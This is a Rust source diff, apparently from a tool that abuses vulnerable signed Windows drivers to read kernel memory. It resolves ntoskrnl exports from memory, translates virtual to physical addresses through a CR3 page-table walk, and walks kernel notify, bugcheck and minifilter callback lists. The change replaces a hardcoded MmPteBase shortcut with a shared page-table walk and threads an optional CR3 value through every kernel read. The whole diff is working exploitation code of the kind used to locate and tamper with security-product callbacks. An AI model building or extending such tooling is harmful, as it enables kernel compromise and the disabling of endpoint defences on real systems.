@@ -164,76 +164,28 @@ fn get_kernel_base() -> Result<u64> {
     Ok(first_entry.image_base as u64)
 }
 
-/// Translate a kernel virtual address to a physical address by reading the
-/// corresponding page table entry (PTE) via the driver.
+/// Translate a kernel virtual address to a physical address.
 ///
-/// Uses the Windows x64 PTE base (`MmPteBase`, hardcoded to
-/// `0xFFFFF68000000000` on Windows 10/11) to locate the PTE for the given
-/// virtual address, reads the 8-byte PTE, extracts the page frame number
-/// (bits 12–51), and computes the physical address.
+/// Delegates to the shared 4-level x64 page-table walk in
+/// `super::translate_va_to_pa()`.  The MmPteBase shortcut
+/// (`0xFFFFF68000000000`) was previously used here as a fast path,
+/// but it only works when the driver handles VA→PA internally.  The
+/// full page-table walk is correct for all driver types.
 ///
-/// # Chicken-and-egg limitation
+/// # MmPteBase fast-path (kept for reference)
 ///
-/// Reading the PTE itself requires issuing a read through the driver.  The
-/// PTE lives at a *virtual* address (`MmPteBase + offset`), so this function
-/// calls `deploy::read_physical_memory` with that virtual address.  For
-/// drivers that internally handle VA→PA conversion (the common case — e.g.
-/// via `MmMapIoSpace` or `MmGetPhysicalAddress`), the driver transparently
-/// translates the PTE address and the read succeeds.  For a truly
-/// physical-only driver (one that passes the supplied address directly to
-/// `MmMapIoSpace` with no conversion), this would fail because the PTE
-/// address is virtual.  A complete solution for such drivers would require
-/// CR3 bootstrapping (reading the page tables starting from a known physical
-/// address obtained from the KPROCESS.DirectoryTableBase field).  No driver
-/// in the current database has `needs_physical_addr = true`, so this
-/// limitation is theoretical.
-unsafe fn translate_va_to_pa(
+/// On Windows 10/11 x64, `MmPteBase = 0xFFFFF680_00000000`.
+/// PTE VA = MmPteBase + ((VA >> 9) & 0x7FFFFFFFF8).
+/// This lets you read the PTE directly and extract the PFN in a single
+/// read instead of a 4-level walk, but requires the driver to accept
+/// the resulting virtual PTE address.
+fn translate_va_to_pa(
     driver: &super::driver_db::VulnerableDriver,
     device_handle: usize,
+    cr3: u64,
     kernel_addr: u64,
 ) -> Result<u64> {
-    // Windows x64 PTE base (MmPteBase).
-    // On Windows 10/11 x64 this is 0xFFFFF68000000000.
-    // Ideally resolved from kernel exports via resolve_kernel_symbol, but
-    // that function itself calls read_kernel_memory, so we hardcode to
-    // avoid infinite recursion.
-    let pte_base: u64 = 0xFFFF_F680_0000_0000;
-
-    // Compute the PTE address for the given virtual address.
-    // PTE VA = MmPteBase + ((VA >> 9) & 0x7FFFFFFFF8)
-    let pte_va = pte_base + ((kernel_addr >> 9) & 0x7FFF_FFFF_FFF8);
-
-    // Read the PTE (8 bytes) via the driver.
-    let mut pte_buf = [0u8; 8];
-    deploy::read_physical_memory(driver, device_handle, pte_va, &mut pte_buf)?;
-
-    let pte_value = u64::from_le_bytes(pte_buf);
-
-    // PTE must be present (bit 0).
-    if pte_value & 1 == 0 {
-        bail!(
-            "PTE not present for VA 0x{:016X} (PTE@0x{:016X} = 0x{:016X})",
-            kernel_addr,
-            pte_va,
-            pte_value
-        );
-    }
-
-    // Extract page frame number (bits 12–51).
-    let pfn = (pte_value >> 12) & 0xF_FFFF_FFFF_u64;
-
-    // Physical address = (PFN << PAGE_SHIFT) | byte_offset_within_page.
-    let phys_addr = (pfn << 12) | (kernel_addr & 0xFFF);
-
-    log::trace!(
-        "VA→PA: 0x{:016X} → 0x{:016X} (PTE=0x{:016X}, PFN=0x{:X})",
-        kernel_addr,
-        phys_addr,
-        pte_value,
-        pfn
-    );
-
-    Ok(phys_addr)
+    super::translate_va_to_pa(driver, device_handle, cr3, kernel_addr)
 }
 
 /// Read kernel virtual memory through the vulnerable driver.
@@ -244,20 +196,25 @@ unsafe fn translate_va_to_pa(
 /// `MmGetPhysicalAddress`).
 ///
 /// When the driver requires a physical address (`needs_physical_addr = true`),
-/// this function first translates the kernel VA to a PA by reading the
-/// corresponding PTE through the driver, then issues the physical read.
+/// this function first translates the kernel VA to a PA via the shared
+/// 4-level page-table walk, then issues the physical read.  CR3 must be
+/// provided in this case or an error is returned.
 unsafe fn read_kernel_memory(
     driver: &super::driver_db::VulnerableDriver,
     device_handle: usize,
     kernel_addr: u64,
     buffer: &mut [u8],
+    cr3: Option<u64>,
 ) -> Result<()> {
     if !driver.needs_physical_addr {
         // Driver accepts virtual addresses and handles VA→PA internally.
         deploy::read_physical_memory(driver, device_handle, kernel_addr, buffer)
     } else {
         // Driver expects a physical address. Translate VA → PA first.
-        let phys_addr = translate_va_to_pa(driver, device_handle, kernel_addr)?;
+        let cr3_val = cr3.context(
+            "CR3 required for VA→PA translation with this driver",
+        )?;
+        let phys_addr = translate_va_to_pa(driver, device_handle, cr3_val, kernel_addr)?;
         deploy::read_physical_memory(driver, device_handle, phys_addr, buffer)
     }
 }
@@ -275,7 +232,7 @@ pub fn resolve_kernel_symbol(
     // Read DOS header.
     let mut dos_header = [0u8; 64];
     unsafe {
-        read_kernel_memory(driver, device_handle, kernel_base, &mut dos_header)?;
+        read_kernel_memory(driver, device_handle, kernel_base, &mut dos_header, None)?;
     }
 
     // Verify MZ signature.
@@ -294,6 +251,7 @@ pub fn resolve_kernel_symbol(
             device_handle,
             kernel_base + pe_offset,
             &mut pe_header,
+            None,
         )?;
     }
 
@@ -333,6 +291,7 @@ pub fn resolve_kernel_symbol(
             device_handle,
             kernel_base + export_dir_rva,
             &mut export_dir,
+            None,
         )?;
     }
 
@@ -356,6 +315,7 @@ pub fn resolve_kernel_symbol(
                 device_handle,
                 kernel_base + names_rva + (mid * 4) as u64,
                 &mut name_rva_buf,
+                None,
             )?;
         }
         let name_rva = u32::from_le_bytes(name_rva_buf) as u64;
@@ -368,6 +328,7 @@ pub fn resolve_kernel_symbol(
                 device_handle,
                 kernel_base + name_rva,
                 &mut name_buf,
+                None,
             )?;
         }
 
@@ -385,6 +346,7 @@ pub fn resolve_kernel_symbol(
                         device_handle,
                         kernel_base + ordinals_rva + (mid * 2) as u64,
                         &mut ordinal_buf,
+                        None,
                     )?;
                 }
                 let ordinal = u16::from_le_bytes(ordinal_buf) as u64;
@@ -397,6 +359,7 @@ pub fn resolve_kernel_symbol(
                         device_handle,
                         kernel_base + functions_rva + ordinal * 4,
                         &mut func_rva_buf,
+                        None,
                     )?;
                 }
                 let func_rva = u32::from_le_bytes(func_rva_buf) as u64;
@@ -494,7 +457,7 @@ fn walk_callback_array(
     let mut array_data = vec![0u8; array_size];
 
     unsafe {
-        read_kernel_memory(driver, device_handle, array_address, &mut array_data)?;
+        read_kernel_memory(driver, device_handle, array_address, &mut array_data, None)?;
     }
 
     for i in 0..MAX_CALLBACK_ENTRIES {
@@ -523,6 +486,7 @@ fn walk_callback_array(
                 device_handle,
                 block_addr + 0x18,
                 &mut func_ptr_buf,
+                None,
             )
         } {
             Ok(()) => {
@@ -588,7 +552,7 @@ fn walk_bugcheck_callback_list(
     // Read the Flink of the list head to get the first record.
     let mut flink_buf = [0u8; 8];
     unsafe {
-        read_kernel_memory(driver, device_handle, list_head_addr, &mut flink_buf)?;
+        read_kernel_memory(driver, device_handle, list_head_addr, &mut flink_buf, None)?;
     }
     let mut current = u64::from_le_bytes(flink_buf);
 
@@ -610,7 +574,7 @@ fn walk_bugcheck_callback_list(
         // Read the CallbackRoutine pointer at offset +0x10.
         let mut func_buf = [0u8; 8];
         match unsafe {
-            read_kernel_memory(driver, device_handle, current + 0x10, &mut func_buf)
+            read_kernel_memory(driver, device_handle, current + 0x10, &mut func_buf, None)
         } {
             Ok(()) => {
                 let func_addr = u64::from_le_bytes(func_buf);
@@ -640,7 +604,7 @@ fn walk_bugcheck_callback_list(
 
         // Follow Flink to the next record.
         unsafe {
-            read_kernel_memory(driver, device_handle, current, &mut flink_buf)?;
+            read_kernel_memory(driver, device_handle, current, &mut flink_buf, None)?;
         }
         current = u64::from_le_bytes(flink_buf);
     }
@@ -785,7 +749,7 @@ fn walk_linked_callback_list(
     // Read the Flink of the list head.
     let mut flink_buf = [0u8; 8];
     unsafe {
-        read_kernel_memory(driver, device_handle, list_head, &mut flink_buf)?;
+        read_kernel_memory(driver, device_handle, list_head, &mut flink_buf, None)?;
     }
     let mut current = u64::from_le_bytes(flink_buf);
 
@@ -802,7 +766,7 @@ fn walk_linked_callback_list(
         //   +0x30: PreOperation callback (offset from LIST_ENTRY start)
         let mut pre_op_buf = [0u8; 8];
         match unsafe {
-            read_kernel_memory(driver, device_handle, current + 0x30, &mut pre_op_buf)
+            read_kernel_memory(driver, device_handle, current + 0x30, &mut pre_op_buf, None)
         } {
             Ok(()) => {
                 let func_addr = u64::from_le_bytes(pre_op_buf);
@@ -832,7 +796,7 @@ fn walk_linked_callback_list(
 
         // Follow Flink.
         unsafe {
-            read_kernel_memory(driver, device_handle, current, &mut flink_buf)?;
+            read_kernel_memory(driver, device_handle, current, &mut flink_buf, None)?;
         }
         current = u64::from_le_bytes(flink_buf);
     }
